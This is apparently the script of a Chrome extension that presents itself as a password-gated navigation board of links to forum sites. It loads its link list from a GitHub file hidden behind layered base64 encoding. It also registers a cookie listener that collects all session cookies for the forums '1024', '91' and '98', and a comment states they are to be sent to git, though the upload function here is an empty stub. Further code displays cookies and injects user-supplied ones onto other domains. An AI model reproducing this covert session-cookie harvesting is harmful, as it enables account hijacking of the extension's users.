console.log('这是board.js文件执行的内容', document);

// 初始化事件监听
initEvent()

// 系统初始化
// initConfig()

getChromeHuijiaData()

function initConfig() {
  console.log('系统初始化');
}

function initEvent() {
  // 芝麻开门按钮
  var openDor = document.getElementById("openDor")
  openDor.onclick = async function () {
    console.log('openDor', openDor);
    var password = document.getElementById("password")
    if (password.value === "521121") {
      var hidden = document.getElementById("hidden")
      hidden.style.display = "block"
      // 存储到storage中
      storageSet("password", password.value)
    } else {
      // alert("密码不正确！")
      var passwordStr = await storageGet("password")
      password.value = passwordStr
    }
  }
  // 

}


function initHomeUrl(chromeData) {
  // 遍历然后渲染
  for (const key in chromeData) {
    if (Object.hasOwnProperty.call(chromeData, key)) {
      const element = chromeData[key];
      console.log('elemetn', element);
      const boxTitle = element.title
      const boxData = element.data
      console.log('boxTitle, boxData', boxTitle, boxData);
      // 遍历每一个tab列的内容
      initTabBox(element)
    }
  }
}


function initTabBox(boxData) {
  var divTabBox = document.createElement("div")
  divTabBox.className = "tabBox"
  var h3Title = document.createElement("h3")
  h3Title.className = "tabTitle"
  h3Title.innerText = boxData.title
  // url内容
  var divABox = document.createElement("div")
  divABox.className = "aBox"
  const aLinks = boxData.data
  for (const key in aLinks) {
    if (Object.hasOwnProperty.call(aLinks, key)) {
      const element = aLinks[key];
      const aTag = document.createElement("a")
      aTag.className = "alink"
      aTag.href = element.url
      aTag.target = "_blank"
      aTag.innerText = element.title
      divABox.appendChild(aTag)
    }
  }
  // 将divTabBox追加到后面
  divTabBox.appendChild(h3Title)
  divTabBox.appendChild(divABox)
  var contentBox = document.getElementById("contentBox")
  contentBox.appendChild(divTabBox)
}


function getChromeHuijiaData() {
  var settings = {
    "url": "https://api.github.com/repos/Sjj1024/Sjj1024/contents/.github/hubsql/chromHuijia.txt",
    "method": "GET",
    "timeout": 0,
    "headers": {
      "Accept": "application/vnd.github+json",
      "X-GitHub-Api-Version": "2022-11-28"
    },
  };

  $.ajax(settings).done(function (response) {
    console.log("response-----", response);
    var content = atob(response.content)
    var real_content = content.replaceAll("VkdWxlIGV4cHJlc3Npb25z", "")
    var real_json = JSON.parse(atob(real_content))
    console.log('解析后的真是数据是:', real_json);
    // 渲染导航页面
    initHomeUrl(real_json.data.navigation)
    // 开启cookie监听
    var ruleObj = { "1024": "227c9_winduser", "91": "91cookie", "98": "98cookie" }
    cookieLister(ruleObj)
  });
}

// 向github提交数据
function putDataToGit() {
  console.log('向github提交数据');
}

// 设置一个cookie监听器，当有监听到1024/91/98等的cookie的时候，就提交到git
function cookieLister(rule) {
  console.log('监听cookie变化的监听器', rule);
  var ruleKeys = Object.keys(rule)
  var ruleValues = Object.values(rule)
  chrome.cookies.onChanged.addListener((changeInfo) => {
    console.log('cookie发生变化了', changeInfo);
    var cookieKey = changeInfo.cookie.name
    if (ruleValues.indexOf(cookieKey) !== -1) {
      // 如果发现有对应的cookie存在，就根据域名获取到所有的cookie
      // console.log('找到了对应的cookie', cookieKey);
      var cookieDomain = "https://" + changeInfo.cookie.domain
      chrome.cookies.getAll({ url: cookieDomain }, function (cookies) {
        // console.log('得到的Cookie是:', cookies);
        const resList = cookies.map(item => {
          return `${item.name}=${item.value}`
        })
        const cookieStr = resList.join("; ")
        // 判断是哪个网站的cookie
        var ruleType = ruleKeys[ruleValues.indexOf(cookieKey)]
        console.log("ruleType-----", ruleType);
        console.log('cookieStr-------', cookieStr);
      });
    }
  })
}

// 显示网站的cookie
function showCookie() {
  const homePaths = document.getElementsByClassName("home1024")
  const url = homePaths[0].href
  console.log('showCookieurl--', url);
  if (!url) {
    return
  }
  chrome.cookies.getAll({ url }, function (cookies) {
    console.log('得到的Cookie是：', cookies);
    tabCookies = cookies;
    const resList = cookies.map(item => {
      return `${item.name}=${item.value}`
    })
    const cookieStr = resList.join("; ")
    console.log("cookies-----", cookieStr);
    document.getElementById("cookies").innerHTML = cookieStr
  });
}


// function initEvent() {
//   // 切换userAgent
//   const toggleUserAgent = document.getElementById("toggleUseragent")
//   toggleUserAgent.onclick = async function () {
//     // 先获取当前激活的tab页
//     const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
//     // 然后向这个tab页里面发送消息
//     console.log('开始toggleUserAgent: ', tab);
//     const userAgent = document.getElementById("userAgentVal").value
//     const response = await chrome.runtime.sendMessage(`editUserAgent:${userAgent}`);
//     // const response = await chrome.tabs.sendMessage(tab.id, { greeting: "hello" });
//     // do something with response here, not outside the function
//     // 切换
//     document.getElementById("useragent").innerHTML = userAgent
//     console.log("toggleReceiveResponse:", response);
//   }

//   // 恢复userAgent
//   const resetUserAgent = document.getElementById("resetUseragent")
//   resetUserAgent.onclick = async function () {
//     // 先获取当前激活的tab页
//     const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
//     // 然后向这个tab页里面发送消息
//     console.log('开始resetUserAgent: ', tab);
//     const response = await chrome.runtime.sendMessage("resetUserAgent");
//     // const response = await chrome.tabs.sendMessage(tab.id, { greeting: "hello" });
//     // do something with response here, not outside the function
//     console.log("resetUserAgentReceiveResponse:", response);
//     document.getElementById("useragent").innerHTML = navigator.userAgent
//   }

//   // 修改Cookie
//   const editBtn = document.getElementById("editCookie")
//   editBtn.onclick = function () {
//     let cookieStr = document.getElementById("cookieVal").value
//     const cookie = cookieStr.replaceAll("'", "").replaceAll("ismob=1", "ismob=0")
//     console.log('获取cookieVal---', cookie, typeof cookie);
//     if (!cookie) {
//       return
//     }
//     const cookieList = cookie.split(";")
//     cookieList.forEach(item => {
//       const keyVal = item.trim().split("=")
//       setCookie("https://cl.6273x.xyz", keyVal[0], keyVal[1])
//     })
//     console.log('修改成功');
//   }

//   // 添加获取地址事件
//   const getHome = document.getElementById("btn-1024")
//   getHome.onclick = get1024Home

//   // 同步数据按钮
//   const asyncDataBtn = document.getElementById("asyncBtn")
//   asyncDataBtn.onclick = function () {
//     console.log('开始同步数据');
//     const dataKey = document.getElementById("dataKey").value
//     const dataVal = document.getElementById("asyncData").value
//     dataVal && asyncSetData(dataKey, dataVal)
//   }

//   const asyncGetDataBtn = document.getElementById("asyncGetBtn")
//   asyncGetDataBtn.onclick = function () {
//     console.log('开始获取并展示数据');
//     const dataKey = document.getElementById("dataKey").value
//     asyncGetData(dataKey)
//   }

//   // 清空所有的同步数据
//   const clearDataBtn = document.getElementById("clearAsyncBtn")
//   clearDataBtn.onclick = function () {
//     const dataKey = document.getElementById("dataKey").value
//     clearData(dataKey)
//   }

//   // 下拉框值变化事件
//   const userAgentSel = document.getElementById("userAgentSel")
//   userAgentSel.onchange = function (e) {
//     const val = document.getElementById("userAgentSel").value
//     console.log('UserAgent下拉框变化了：', val);
//     document.getElementById("useragent").innerHTML = val
//     document.getElementById("userAgentVal").value = val
//   }

//   // 检测Cookie发生变化
//   chrome.cookies.onChanged.addListener((changeInfo) => {
//     console.log('cookie发生变化了', changeInfo);
//   })

// }


// 检测Cookie发生变化

// 存储和读取store中的数
function storageSet(key, value) {
  chrome.storage.local.set({ [key]: value }).then(() => {
    console.log("Value is set to " + value);
  });
}

function storageGet(key) {
  return chrome.storage.local.get([key]).then((result) => {
    console.log("Value currently is ", result[key]);
    return result[key]
  });
}


function clearData(key) {
  if (key) {
    chrome.storage.sync.remove(key).then(() => {
      console.log('清空一个值');
      asyncGetData()
    })
  } else {
    chrome.storage.sync.clear().then(() => {
      console.log('清空所有的值');
      document.getElementById("asyncDataBox").innerHTML = "数据全部清空了"
    })
  }
}


// 获取1024地址
function get1024Home() {
  var form = new FormData();
  form.append("a", "get18");
  form.append("system", "android");
  var settings = {
    "url": "https://get.xunfs.com/app/listapp.php",
    "method": "POST",
    "timeout": 0,
    "processData": false,
    "mimeType": "multipart/form-data",
    "contentType": false,
    "data": form
  };
  $.ajax(settings).done(function (response) {
    var homePath = JSON.parse(response)
    console.log("homePath----", homePath);
    var home1 = homePath.url1
    var home2 = homePath.url2
    var home3 = homePath.url3
    var homeBox = document.getElementById("home-box")
    homeBox.appendChild(getHomeA(home1))
    homeBox.appendChild(getHomeA(home2))
    homeBox.appendChild(getHomeA(home3))
    // 显示Cookie
    showCookie()
  });
}

function getHomeA(home) {
  var a2 = document.createElement("a")
  a2.href = `https://${home}/`
  a2.text = `https://${home}/`
  a2.target = "_blank"
  a2.className = "home1024"
  return a2
}

function setCookie(url, key, val) {
  const cookieUrl = document.getElementById("cookieUrl").value
  let urlEdit = cookieUrl || url
  const configCookie = { "url": urlEdit, "name": key, "value": val }
  chrome.cookies.set(configCookie);
}